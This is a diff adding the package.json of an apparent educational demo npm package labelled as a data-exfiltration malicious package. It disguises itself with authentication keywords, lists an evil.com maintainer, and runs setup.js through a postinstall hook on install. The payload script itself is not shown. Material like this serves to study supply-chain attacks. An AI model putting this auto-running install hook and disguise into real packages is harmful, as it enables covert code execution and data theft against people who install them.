@@ -1,0 +1,17 @@
+{
+  "name": "package1-exfiltration",
+  "version": "1.0.0",
+  "description": "Data exfiltration malicious package - EDUCATIONAL DEMO",
+  "main": "index.js",
+  "scripts": {
+    "start": "node setup.js",
+    "postinstall": "node setup.js"
+  },
+  "keywords": [
+    "auth",
+    "authentication",
+    "security"
+  ],
+  "author": "new_maintainer@evil.com",
+  "license": "MIT"
+}
